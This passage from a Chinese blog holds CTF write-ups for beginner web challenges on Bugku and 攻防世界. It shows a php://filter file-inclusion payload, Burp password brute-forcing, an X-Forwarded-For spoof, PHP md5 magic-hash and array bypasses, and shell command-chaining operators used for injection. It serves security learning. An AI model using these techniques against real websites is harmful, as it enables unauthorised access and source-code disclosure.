<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/_J5%28NO03FKQI%5BU%5D%7B0QOIL1L.png"></p>
<p>仔细观察了一下，发现有一次请求中源代码会显示出flag，所以我们使用burpsuite抓包，然后进行若干次发送请求</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/WLO9%24%5B0%40N%7D96OW%5B%25F%60Q626H.png"></p>
<p>在请求图片名字为10的时候，暴露出flag。</p>
</li>
<li><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>题目环境打不开，可能平台出问题了，暂时跳过……</p>
</li>
<li><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>打开题目，给出php代码，我们进行一波代码审计</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/TID%7DDC4B%283WM90Y_%5D%60DLX2X.png"></p>
<p>首先需要对args用get方式进行一个传参，第一个if里面含有正则，对一些字符进行了一个过滤，还发现下面<strong>var_dump</strong>里的变量有两个$$，这是一个可变变量。</p>
<blockquote>
<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其工作原理是该变量的名称由另一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”.</p>
</blockquote>
<p>所以我们需要对args传一个变量的值，通过var_dump来显示它的信息，php中的全局变量有以下几种</p>
<blockquote>
<ul>
<li>$_POST [用于接收post提交的数据]</li>
<li>$_GET [用于获取url地址栏的参数数据]</li>
<li>$_FILES [用于文件就收的处理img 最常见]</li>
<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>
<li>$_SESSION [用于存储session的值或获取session中的值]</li>
<li>$_REQUEST [具有get,post的功能，但比较慢]</li>
<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>
<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>
<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>
</ul>
</blockquote>
<p>我们这里使用GLOBALS全局变量进行构造</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/EW%7BSV%7B4D%29ZL3L~CLXXN4M%25Q.png"></p>
<p>ok，回显出flag。</p>
</li>
<li><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>打开页面提示是jsfuck加密</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/S%24E92B%60%7BE%24X%29T1UC%28%400H%24FG.png"></p>
<p>没有什么有用的信息，我们查看源代码，发现一堆编码出现在我们面前</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/G%2444%402T5FQDV%25%7DF8OY%28M1AS.png"></p>
<p>jsfuck其实是一串js代码，经过了特殊的编写方式，把包含的字符做到极致，最后只剩下 ()+[]!  这六个字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false       &#x3D;&gt;  ![]</span><br><span class="line">true        &#x3D;&gt;  !![]</span><br><span class="line">undefined   &#x3D;&gt;  [][[]]</span><br><span class="line">NaN         &#x3D;&gt;  +[![]]</span><br><span class="line">0           &#x3D;&gt;  +[]</span><br><span class="line">1           &#x3D;&gt;  +!+[]</span><br><span class="line">2           &#x3D;&gt;  !+[]+!+[]</span><br><span class="line">10          &#x3D;&gt;  +[[+!+[]]+[+[]]]</span><br><span class="line">Array       &#x3D;&gt;  []</span><br><span class="line">Number      &#x3D;&gt;  +[]</span><br><span class="line">String      &#x3D;&gt;  []+[]</span><br><span class="line">Boolean     &#x3D;&gt;  ![]</span><br><span class="line">Function    &#x3D;&gt;  [][&quot;filter&quot;]</span><br><span class="line">run         &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">eval        &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return eval&quot;)()( CODE )</span><br><span class="line">window      &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>

<p>所以我们复制粘贴这串jsfuck到控制台输出，得到结果</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/%28JU~1L3FO~6KTRQV886%25%60%40W.png"></p>
<p>再按题目提示的，转换成大写的形式，提交即可。</p>
</li>
<li><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>进去后，发现确实和页面说的一样，啥信息都没有</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/AJH%28INH1G56374%249K6G%29IWB.png"></p>
<p>好，我们抓包看看，有没有什么有用的信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/2CWHD%60%25%5BADSG%25H2W%5DYX9H%29Y.png"></p>
<p>好吧，flag这就出来了。</p>
</li>
<li><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>打开环境，是一个被挂了黑页的网站</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/QQ%E6%88%AA%E5%9B%BE20201018162409.png"></p>
<p>我们先扫一下页面，看看留下了什么</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/UT~3VV~T72FTBD_PXMF3L68.png"></p>
<p>发现有一个shell.php，我们去访问一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/I%40OI%250XWBJ%40M5%28X%25QY%286IAC.png"></p>
<p>发现是一个需要登录的页面，我们使用burpsuite爆破一下密码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/2GRA6H%7BML86%7DW%5DM8R7A8%29SR.png"></p>
<p>爆破得到密码为hack，输入密码，得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/T6Z2%25VF%290%7D%2938%5D%7B%7D9PSS%602F.png"></p>
</li>
<li><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>打开页面，发现是一个登录框，先查看一下源码，找找有没有什么提示</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/Z8%40230%7BC%7B6V8GOE7D851%291M.png"></p>
<p>发现一串base64加密的数据，我们去解密看看</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/B9_3MUJUL493G0Y816ECBR1.png"></p>
<p>猜测这应该是密码，账号的话默认admin试试，毕竟管理员系统嘛</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/0MBMGO20DMNSRR1%29%40%5BD85H0.png"></p>
<p>发现提示我们ip禁止登陆，应该是要指定ip，本地本地本地…emmm，那是提示我们127.0.0.1吧，试试一波。</p>
<p>加个X-Forwarded-For头进去发一下包</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/NWQJ4%7D9Y_%40I7B8%5B%25COSZ%25%28Y.png"></p>
<p>发现登陆成功，flag回显出来了，嘿嘿嘿。</p>
</li>
<li><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进来就提示我们查看源代码，不错不错</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/~TO%29FETA5%29%254NP4%7D7Z%29%29%60F2.png"></p>
<p>移步去源代码，发现js里有三串经过url编码的数据</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/E%7BUM%24%408%28ZAX3GGX%7D5TXVB%60R.png"></p>
<p>我们去解码后，把这三串解密的数据拼接起来，这里建议去在线的js格式美化网站进行格式化，然后得到</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/XVK%24A9MCZ4K%7BWC%28O09K%29J9F.png"></p>
<p>我们把这一串字符串“67d709b2baa648cf6e87a7114f1”输入提交框</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/%5B%5DT%40%25X0FAPWVTXIR%5DU%5DS%296M.png"></p>
<p>flag就出来了，但让我有一点点迷惑，按js代码里说应该获取的是id为password里的值，但我们刚刚看源代码，提交框的id是flag…来自菜鸡的迷惑。</p>
</li>
<li><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>打开页面，只有一个链接点击</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/U5%5D7%7B%406A_%2421B%2946Q%5BR%60%4033.png"></p>
<p>点开连接后显示一个文本，查看了源码发现没有什么信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/%5B%29F%40DM%5B9%409W%7B92XX%29XQFEAD.png"></p>
<p>注意到url有个file参数，猜一波文件包含。</p>
<p>使用php协议进行读取：file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>先对这个协议进行一波解释：</p>
<blockquote>
<p>file进行get传参，题目前面提示我们的index.php，php://filter/是访问本地文件的协议，read表示要读取的链的筛选列表，resource表示访问的目标文件。</p>
<p>为什么中间要进行一波base64加密呢？因为不进行base64加密，会直接当成php文件执行。而我们传递的参数被include()函数引入了base64的格式，执行不成功，所以会返回文件的源码。</p>
</blockquote>
<p>使用php文件协议后，页面返回一串被base64加密的源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C5TYJ8CEF%29N%5DM%60%5BNNNC%60W%5B5.png"></p>
<p>解密base64之后得到</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C_%7DDCAG%5B2RL2BJM%40Z4SN3VI.png"></p>
<p>发现flag藏在注释中，闯关成功！</p>
</li>
<li><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>进来是一个输入密码的登陆框</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/S%25XM%289XXWB3O%24H%28%7DJEJUA%5D5.png"></p>
<p>老规矩。按照题目提示，使用burpsuite抓包爆破密码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/_SB%40QY%24%7B3_O3N_ZXVDJU46I.png"></p>
<p>因为说的5位数字，所以按10000到90000爆破试试</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png"></p>
<p>去冲杯牛奶先…</p>
<p>ok。爆破成功，查看response，得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png"></p>
</li>
<li><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>好家伙，又是一道链接挂掉的题目，待续…</p>
</li>
<li><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开页面是一串字符串，没看懂啥意思</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/NPU2G0NO%29~UHHH%7D%24P%29HJZ2U.png"></p>
<p>按照题目提示，应该是有备份文件泄露，猜测应该是常见的bak文件，使用工具扫一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/%28~%60BF%7DB_%24MW9P%60I%2827BN2ZN.png"></p>
<p>发现存在bak文件，我们访问这个路径后，下载bak文件，打开出现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码意思是，对key进行一个过滤，然后传参key1和key2两个参数，同时key1和key2的md5值要相等，并且未经过md5加密前的值不能相等，满足条件就会输出flag。</p>
<p>对于key过滤我们可以考虑使用双写的方法，kkeyey1</p>
<p>这里说一下可以利用==漏洞和数组漏洞绕过md5</p>
<p>==漏洞：</p>
<blockquote>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
</blockquote>
<p>数组漏洞：</p>
<p>nbsp;md5()函数无法处理数组，如果我们传数组进去，会返回一个NULL，所以两个数组经过加密后得到的都是相同的NULL。</p>
<p>我们尝试一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/JE36DTP5PN~GP5EA2POZ%28YI.png"></p>
<p>ok，成功绕过，取得flag。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web区~持续更新中！</title>
    <url>/posts/14571/</url>
    <content><![CDATA[<h1 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h1><ul>
<li><h2 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h2><hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/NE96%7DBO%60EX%28%5B%40YGU%25FPT%29I3.png"></p>
<p>题目提示查看源代码，但无法使用右键打开开发者模式，我们这个时候可以使用f12快捷键打开开发者模式</p>
<br>

<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%242%29AW49Y%5BP5%407W%7BM8%7D%25S%40%25R.png"></p>
<br>

<p>flag就藏在源代码里，我们操练起cv大法，然后提交拿分<del>~</del></p>
</li>
</ul>
<ul>
<li><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/_6%5D5%7B%7DXV%29FML%60R14%7DQMV9N4.png"></p>
<br>

<blockquote>
<p>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指    定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。另外，robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。</p>
</blockquote>
<br>

<p>所以我们在url输入robots.txt</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/H%5BM%5D%25%29J%5BP89Q9BM2U8~11VI.png"></p>
<p>跳转到页面，提示我们还有个f1ag_1s_h3re.php,我们继续访问文件</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%7BQ%25D9C7260DI5L%5BSMIY8X2G.png"></p>
<br>

<p>即可拿到flag呦~</p>
</li>
</ul>
<ul>
<li><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/4VR%40591%60F0%7D%5BYOQ%40X5%5D%7BYEF.png"></p>
<br>

<p>这道题提示我们是文件备份，文件泄露的问题</p>
<p>常见的备份文件名为：index.php~和index.php.bak</p>
<p>试着输入了一下，没想到成功下载了文件，打开文件，即可得到flag嗷~</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>备份文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line"><span class="css">            <span class="selector-tag">margin-left</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-right</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-TOP</span><span class="selector-pseudo">:200PX</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:20em</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>你知道index.php的备份文件名吗？<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">$<span class="attr">flag</span>=<span class="string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span></span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p>本题也可使用目录遍历搜索</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Y2LMCC%25TTM%5D%7BJ474Q3N42%5BD.png"></p>
<p>感觉自己是不是有点厉害了现在,操练起兵器，我们继续闯关，冲冲冲~</p>
</li>
</ul>
<ul>
<li><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><hr>
<p>此关提示我们信息在cookie中</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/U1SU0%29T8J378V4ULADE%5DAL5.png"></p>
<br>

<p>去查看文件的请求头和响应头信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%2450CQV6YEE5P%40%28SH%29_GUBCQ.png"></p>
<br>

<p>提示我们去查看cookie.php，我们去访问这个文件，让我们继续看文件响应头</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/N%28OZ%25%7D57V5%7BB_9J%7DJ%28N5K%28J.png"></p>
<br>

<p>打开文件查看响应头，gogogo！</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/9W43RJ_R%25UC%7D3W%408%28%24DROGI.png"></p>
<br>

<p>flag就出现在了我们面前，金币++，开心~</p>
</li>
</ul>
<ul>
<li><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><hr>
<p>题目提示页面按钮不能打开，点击了发现确实打不开</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/0QDTUEI%5DW3HBBG_VJKPY%60~S.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/%5D608EGFTAJL%29U%24AOJALE4%5BX.png"></p>
<br>

<p>这时候运用到我们html的知识，前台万物可更改！我们打开源码修改属性，把disabled去掉，按钮即可打开</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/2F%40%40E_S6P5JDKK%7B~0%60%609BL1.png"></p>
<br>

<p>点击后，flag就出现啦~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/17LAH%25%7B9QR%60%7DB%24F%7BSGZ5BMD.png"></p>
</li>
</ul>
<ul>
<li><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><hr>
<p>本题提示为弱密码爆破</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/7O1MJB2%607W_M~F%60QVKQ4SLL5.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/YU%60V%60%7B9Y16XM%5BY1Y%28%5B4FZF7.png"></p>
<br>

<p>我们尝试抓包查看源代码，发现提示我们用户名为admin，使用密码爆破</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/%24R_D76HB0S%409GL%24RMWZ50FM.png"></p>
<br>

<p>我们使用字典配合burpsuite进行一个爆破，最后得到结果~，在响应包里拿到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/VD2TF%7BN%5DP%60F47D%40%7DZI9%60EG8.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/NA9%25KLH%29H95R14I0E%28%243X46.png"></p>
</li>
</ul>
<ul>
<li><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><hr>
<p>本题给了我们一个ping页面，我们尝试ping了本机地址之后回显信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/RY~GME%5DY0S%7BCWA11S%28%24KUYE.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/881NMO91RVEV%29%7BO4%5D%29L%7DKTC.png"></p>
<br>

<p>页面回显ping -c 3 127.0.0.1 ，这里提示我们这是linux系统，ping三次。我们尝试使用linux命令执行，同时执行多条命令，发现有回显</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/%7BPQ%7DQ33TMU1UC%297_%25UL3%5BQC%20%281%29.png"></p>
<br>

<p>于是我们尝试寻找带有flag的文件~，可以用；多条执行也可以使用|只执行后面的语句</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/F8F%60R%7DHS%5B_J8UDX%28IQE0%5B26.png"></p>
<br>

<p>发现flag.txt可疑文件，我们去查看一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/_M4D~KMQ~K%7D%7BKET0TJSEQ31.png"></p>
<p>轻轻松松获得flag咯~</p>
<br>

<p><strong>扩充知识：</strong></p>
<table>
<thead>
<tr>
<th><strong>常见连接符</strong></th>
<th><strong>举例</strong></th>
<th><strong>效果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>A;B</td>
<td>先执行A，再执行B</td>
</tr>
<tr>
<td>&amp;</td>
<td>A&amp;B</td>
<td>简单拼接，A B之间无制约关系</td>
</tr>
<tr>
<td>|</td>
<td>A|B</td>
<td>显示B的执行结果</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>A&amp;&amp;B</td>
<td>A执行成功，然后才会执行B</td>
</tr>
<tr>
<td>||</td>
<td>A||B</td>
<td>A执行失败，然后才会执行B</td>
</tr>
</tbody></table>
</li>
</ul>
<ul>
<li><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><hr>
<p>本题需要我们掌握php弱类型比较，打开环境给出我们一些源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/W%7DIBQVLJ20X%7BPN4H%5BOWVT5S.png"></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/XYN%25%7B%60Q%5BS31GMA4%29B41AA%256.png"></p>
<p>首先我们分析一下源代码：</p>
<p>1）有include函数，包含了config.php文件</p>
<p>2）url需要接收参数a和参数b</p>
<p>3）如果$a=0或者$a为真,输出$flag1</p>
<p>4）如果b是数字或者字符串，如果$b&gt;1234就输出$flag2</p>
<br>

<p>总结，我们构造a参数得等于0且不为假，构造b参数&gt;1234且不能为数字和字符串。</p>
<p>粗略来看，这不是难为我们吗！!不过兄弟莫慌，这个时候我们想起前面所说的php弱类型比较，那这弱类型到底指的什么呢？下面我们一起学习一下~</p>
